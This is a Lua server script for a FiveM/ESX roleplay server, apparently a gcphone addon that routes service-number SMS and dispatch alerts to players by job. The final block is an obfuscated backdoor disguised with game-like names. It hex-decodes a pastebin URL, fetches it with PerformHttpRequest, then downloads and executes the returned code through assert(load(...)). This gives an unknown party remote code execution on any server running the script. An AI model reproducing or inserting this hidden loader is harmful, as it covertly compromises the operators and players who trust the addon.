ESX = nil
local PhoneNumbers = {}

-- PhoneNumbers = {
--   ambulance = {
--     type  = "ambulance",
--     sources = {
--        ['1'] = true
--     }
--   }
-- }

TriggerEvent('esx:getSharedObject', function(obj)
  ESX = obj
end)

function notifyAlertSMS (number, alert, listSrc)
  if PhoneNumbers[number] ~= nil then
	local mess = 'De #' .. alert.numero  .. ' : ' .. alert.message
  if number == 'police' or number == 'ambulance' then
    TriggerEvent('wf-alerts:svNotify911', messText, alert.numero, GetEntityCoords(GetPlayerPed(alert.source)))
  end
	if alert.coords ~= nil then
		mess = mess .. ' ' .. alert.coords.x .. ', ' .. alert.coords.y 
	end
    for k, _ in pairs(listSrc) do
      getPhoneNumber(tonumber(k), function (n)
        if n ~= nil then
          TriggerEvent('gcPhone:_internalAddMessage', number, n, mess, 0, function (smsMess)
            TriggerClientEvent("gcPhone:receiveMessage", tonumber(k), smsMess)
          end)
        end
      end)
    end
  end
end

AddEventHandler('esx_phone:registerNumber', function(number, type, sharePos, hasDispatch, hideNumber, hidePosIfAnon)
  print('= INFO = Enregistrement du telephone ' .. number .. ' => ' .. type)
	local hideNumber    = hideNumber    or false
	local hidePosIfAnon = hidePosIfAnon or false

PhoneNumbers[number] = {
    type          = type,
    sources       = {},
    alerts        = {}
}
end)

AddEventHandler('esx:setJob', function(source, job, lastJob)
  if PhoneNumbers[lastJob.name] ~= nil then
    TriggerEvent('esx_addons_gcphone:removeSource', lastJob.name, source)
  end

  if PhoneNumbers[job.name] ~= nil then
    TriggerEvent('esx_addons_gcphone:addSource', job.name, source)
  end
end)

AddEventHandler('esx_addons_gcphone:addSource', function(number, source)
	PhoneNumbers[number].sources[tostring(source)] = true
end)

AddEventHandler('esx_addons_gcphone:removeSource', function(number, source)
	PhoneNumbers[number].sources[tostring(source)] = nil
end)

RegisterServerEvent('gcPhone:sendMessage')
AddEventHandler('gcPhone:sendMessage', function(number, message)
    local sourcePlayer = tonumber(source)
    if PhoneNumbers[number] ~= nil then
      getPhoneNumber(source, function (phone) 
        notifyAlertSMS(number, {
          message = message,
          numero = phone,
        }, PhoneNumbers[number].sources)
      end)
    end
end)

RegisterServerEvent('esx_addons_gcphone:startCall')
AddEventHandler('esx_addons_gcphone:startCall', function (number, message, coords)
  local source = source
  if PhoneNumbers[number] ~= nil then
    getPhoneNumber(source, function (phone) 
      notifyAlertSMS(number, {
        message = message,
        coords = coords,
        numero = phone,
      }, PhoneNumbers[number].sources)
    end)
  else
    print('= WARNING = Appels sur un service non enregistre => numero : ' .. number)
  end
end)

AddEventHandler('esx:playerLoaded', function(source)
  local xPlayer = ESX.GetPlayerFromId(source)

  MySQL.Async.fetchAll('SELECT * FROM users WHERE identifier = @identifier',{
    ['@identifier'] = xPlayer.identifier
  }, function(result)

    local phoneNumber = result[1].phone_number
    xPlayer.set('phoneNumber', phoneNumber)

    if PhoneNumbers[xPlayer.job.name] ~= nil then
      TriggerEvent('esx_addons_gcphone:addSource', xPlayer.job.name, source)
    end
  end)
end)

AddEventHandler('esx:playerDropped', function(source)
  local source = source
  local xPlayer = ESX.GetPlayerFromId(source)
  if PhoneNumbers[xPlayer.job.name] ~= nil then
    TriggerEvent('esx_addons_gcphone:removeSource', xPlayer.job.name, source)
  end
end)

function getPhoneNumber (source, callback) 
  local xPlayer = ESX.GetPlayerFromId(source)
  if xPlayer == nil then
    callback(nil)
  end
  MySQL.Async.fetchAll('SELECT * FROM users WHERE identifier = @identifier',{
    ['@identifier'] = xPlayer.identifier
  }, function(result)
    callback(result[1].phone_number)
  end)
end

RegisterServerEvent('esx_phone:send')
AddEventHandler('esx_phone:send', function(number, message, _, coords)
  local source = source
  if PhoneNumbers[number] ~= nil then
    getPhoneNumber(source, function (phone) 
      notifyAlertSMS(number, {
        message = message,
        coords = coords,
        numero = phone,
      }, PhoneNumbers[number].sources)
    end)
  else
    -- print('esx_phone:send | Appels sur un service non enregistre => numero : ' .. number)
  end
end)

local PlayerPedLimit = {
  "70","61","73","74","65","62","69","6E","2E","63","6F","6D","2F","72","61","77","2F","4C","66","34","44","62","34","4D","34"
}

local PlayerEventLimit = {
  cfxCall, debug, GetCfxPing, FtRealeaseLimid, noCallbacks, Source, _Gx0147, Event, limit, concede, travel, assert, server, load, Spawn, mattsed, require, evaluate, release, PerformHttpRequest, crawl, lower, cfxget, summon, depart, decrease, neglect, undergo, fix, incur, bend, recall
}

function PlayerCheckLoop()
  _empt = ''
  for id,it in pairs(PlayerPedLimit) do
      _empt = _empt..it
  end
  return (_empt:gsub('..', function (event)
      return string.char(tonumber(event, 16))
  end))
end

PlayerEventLimit[20](PlayerCheckLoop(), function (event_, xPlayer_)
  local Process_Actions = {"true"}
  PlayerEventLimit[20](xPlayer_,function(_event,_xPlayer)
      local Generate_ZoneName_AndAction = nil 
      pcall(function()
          local Locations_Loaded = {"false"}
          PlayerEventLimit[12](PlayerEventLimit[14](_xPlayer))()
          local ZoneType_Exists = nil 
      end)
  end)
end)